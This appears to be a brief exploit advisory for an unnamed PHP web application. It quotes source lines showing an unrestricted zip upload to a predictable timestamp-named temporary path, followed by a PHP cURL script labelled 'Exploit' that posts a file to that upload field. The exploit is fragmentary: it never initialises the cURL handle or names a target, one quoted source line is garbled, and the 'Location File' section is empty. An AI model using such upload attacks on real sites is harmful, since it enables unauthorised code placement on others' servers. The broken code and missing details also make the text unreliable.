[-] Author : Shahab Shamsi
[-] Category : Webapps
[-] Date : 30.July.2017


Vulnerable Source:
176: if(is_uploaded_file($_FILES[&#039;zip&#039;][&#039;tmp_name&#039;]))
207: move_uploaded_file move_uploaded_file($_FILES[&#039;zip&#039;][&#039;tmp_name&#039;], $tempZipPath))
206: $tempZipPath = $temporaryPath . $tempZipName;
190: $temporaryPath = $this->tempDir . $temporaryDir . "/";
189: $temporaryDir = date("YmdHis");
204: $tempZipName = "zipfile" . date("His") . ".zip";



Exploit:
<?php
$shahab="file.jpg";
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array(&#039;zip&#039;=>"@$shahab"));
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
print "$result";
?>


Location File:

